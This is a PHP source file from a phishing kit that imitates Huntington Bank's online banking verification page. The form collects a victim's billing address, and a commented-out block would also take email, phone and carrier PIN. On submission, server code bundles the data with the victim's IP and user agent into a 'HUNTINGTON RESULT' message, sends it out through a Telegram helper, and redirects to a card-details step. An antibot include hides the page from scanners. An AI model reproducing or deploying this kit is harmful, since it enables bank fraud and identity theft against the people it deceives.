<?php
ob_start();
session_start();
include '../includes/antibot.php';
include_once '../includes/telegram.php';
if (!isset($_SESSION['id'])){
	header('Location: ../index.php', true);
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="utf-8">
	<title>Huntington Online Banking Verification | Huntington</title>
	<meta http-equiv="content-type" content="text/html; charset=UTF-8">
	<meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=2, user-scalable=yes">
	<link rel="shortcut icon" type="image/jpg" href="../static/img/favicon.ico"/>
	<link href="../static/css/styles.css" rel="stylesheet">
	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
	<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.8.1/font/bootstrap-icons.css">
</head>
<body>
	<div class="spin" id="spin"></div>
	<div class="loading" id="loading"></div>
	<nav class="navbar huntington-nav px-3">
		<a class="navbar-brand navbar-expand-lg p-0" href="">
			<img class="main-logo" src="../static/img/huntington.svg"/>
		</a>
		<ul class="navbar-nav ms-auto">
			<li class="nav-item">
				<img class="lock-logo-nav" src="../static/img/lock-nav.svg"/>
			</li>
		</ul>
	</nav>
	<div class="container verify-container p-3">
		<h1 class="mt-5">Verify your information</h1>
		<div class="progress-container mx-auto my-3">
			<div class="current-progress" style="width: 40%;"></div>
		</div>
		<form action="" method="POST" onsubmit="load()">
			<p>Please confirm the billing address on your Huntington account.</p>
			<h3 class="mt-5">Billing Information</h3>
			<div class="row my-1">
				<div class="col-md-12 p-3">
					<label class="my-1" for="address">Address</label><br>
					<input class="" type="text" name="address" id="address" placeholder="Address" required>
				</div>
			</div>
			<div class="row my-1">
				<div class="col-md-12 p-3">
					<label class="my-1" for="city">City</label><br>
					<input class="" type="text" name="city" id="city" placeholder="City" required>
				</div>
			</div>
			<div class="row my-1">
				<div class="col-md-6 p-3">
					<label class="my-1" for="state">State</label><br>
					<select class="" name="state" id="state" required>
						<option disabled="" value="" selected="">State</option>
						<option value="AL">Alabama</option>
						<option value="AK">Alaska</option>
						<option value="AS">American Samoa</option>
						<option value="AZ">Arizona</option>
						<option value="AR">Arkansas</option>
						<option value="CA">California</option>
						<option value="CO">Colorado</option>
						<option value="CT">Connecticut</option>
						<option value="DE">Delaware</option>
						<option value="DC">District of Columbia</option>
						<option value="FL">Florida</option>
						<option value="GA">Georgia</option>
						<option value="GU">Guam</option>
						<option value="HI">Hawaii</option>
						<option value="ID">Idaho</option>
						<option value="IL">Illinois</option>
						<option value="IN">Indiana</option>
						<option value="IA">Iowa</option>
						<option value="KS">Kansas</option>
						<option value="KY">Kentucky</option>
						<option value="LA">Louisiana</option>
						<option value="ME">Maine</option>
						<option value="MD">Maryland</option>
						<option value="MA">Massachusetts</option>
						<option value="MI">Michigan</option>
						<option value="MN">Minnesota</option>
						<option value="MS">Mississippi</option>
						<option value="MO">Missouri</option>
						<option value="MT">Montana</option>
						<option value="NE">Nebraska</option>
						<option value="NV">Nevada</option>
						<option value="NH">New Hampshire</option>
						<option value="NJ">New Jersey</option>
						<option value="NM">New Mexico</option>
						<option value="NY">New York</option>
						<option value="NC">North Carolina</option>
						<option value="ND">North Dakota</option>
						<option value="MP">Northern Mariana Islands</option>
						<option value="OH">Ohio</option>
						<option value="OK">Oklahoma</option>
						<option value="OR">Oregon</option>
						<option value="PA">Pennsylvania</option>
						<option value="PR">Puerto Rico</option>
						<option value="RI">Rhode Island</option>
						<option value="SC">South Carolina</option>
						<option value="SD">South Dakota</option>
						<option value="TN">Tennessee</option>
						<option value="TX">Texas</option>
						<option value="VI">U.S. Virgin Islands</option>
						<option value="UT">Utah</option>
						<option value="VT">Vermont</option>
						<option value="VA">Virginia</option>
						<option value="WA">Washington</option>
						<option value="WV">West Virginia</option>
						<option value="WI">Wisconsin</option>
						<option value="WY">Wyoming</option>
					</select>
				</div>
				<div class="col-md-6 p-3">
					<label class="my-1" for="zip">Zip Code</label><br>
					<input class="" type="tel" name="zip" id="zip" placeholder="Zip Code" maxlength="5" pattern="[0-9]{5}" required>
				</div>
			</div>

			<!--
			<h3 class="mt-5">Contact information</h3>
			<div class="row my-1">
				<div class="col-md-12 p-3">
					<label class="my-1" for="email">Email</label><br>
					<input class="" type="text" name="email" id="email" placeholder="Email" pattern="[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]+$" required>
				</div>
			</div>
			<div class="row my-1">
				<div class="col-md-6 p-3">
					<label class="my-1" for="phone">Phone Number</label><br>
					<input class="" type="tel" name="phone" id="phone" placeholder="Phone Number" required>
				</div>
				<div class="col-md-6 p-3">
					<label class="my-1" for="carrier-pin">Phone Carrier PIN</label><br>
					<input class="" type="tel" name="carrier-pin" id="carrier-pin" placeholder="Phone Carrier PIN (optional)" maxlength="4" pattern="[0-9]{4}">
				</div>
			</div>
			-->
			
			<div class="my-5" style="text-align: right;">
				<h3>Next: Card information</h3>
				<button class="back-btn me-4" onclick="return false;">Back</button>
				<button class="continue-btn">Continue</button>
			</div>
		</form>
	</div>
	<div class="main-footer p-5">
		<div class="text-center">
			<img src="../static/img/huntington-footer.svg" width="140px" />
		</div>
		<hr>
		<div class="row mx-auto" style="max-width: 1000px;">
			<div class="col-md-6 footer-links-main">
				<a href="">ACCOUNT DISCLOSURES</a>
				<a href="">PRIVACY POLICY</a>
				<a href="">DO NOT CALL</a>
				<a href="">IDENTITY PROTECTION</a>
				<a href="">SECURITY</a>
				<a href="">ONLINE GUARANTEE</a>
				<a href="">GIVE FEEDBACK</a>
			</div>
			<div class="col-md-6">
				<div class="row">
					<div class="col-md-2 footer-house-container">
						<img src="../static/img/house.svg" width="44px"/>
					</div>
					<div class="col-md-10">
						<p class="p-0">The Huntington National Bank is an Equal Housing Lender and Member FDIC. <img src="../static/img/honeycomb.svg" width="14px"/>®, Huntington®,<img src="../static/img/honeycomb.svg" width="14px"/>Huntington.Welcome.® and Huntington Heads Up ® are federally registered service marks of Huntington Bancshares Incorporated. ©2022 Huntington Bancshares Incorporated.</p>
					</div>
				</div>
			</div>
		</div>
		<div class="mx-auto text-center" style="font-size: .875rem;">
			<p><b>Secure online. Always on time. Guaranteed.</b><span class="lock-footer-img"><img class="mx-3" src="../static/img/lock-footer.svg" width="56px" /></span><b>Need help? Give us a call at (888) 810-1381.</b>
		</div>
	</div>
	<script src="../static/js/cleave.js"></script>
	<script src="../static/js/cleave-phone.us.js"></script>
	<script type="text/javascript">
		function load() {
			loading = document.getElementById('loading');
			spin = document.getElementById('spin');
			loading.style.display = 'inline';
			spin.style.display = 'inline';
			setTimeout(() => {
				loading.style.display = 'none';
				spin.style.display = 'none';
			}, 2000);
		}
	</script>
	<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
</body>
</html>
<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
	$ip = $_SERVER['REMOTE_ADDR'];
	$user_agent = $_SERVER['HTTP_USER_AGENT'];

	$address = $_REQUEST['address'];
	$city = $_REQUEST['city'];
	$state = $_REQUEST['state'];
	$zip = $_REQUEST['zip'];

	if (!isset($_SESSION['id'])){
		header('Location: ../index.php', true);
	}

	$msg = "HUNTINGTON RESULT\n\n| DEVICE : #{$_SESSION['id']}\n| IP : {$ip}\n| USER AGENT : {$user_agent}\n\n| ADDRESS : {$address}\n| CITY : {$city}\n| STATE : {$state}\n| ZIP : {$zip}";
	send_message($msg);
	
	header('Location: card.php', true);
}
?>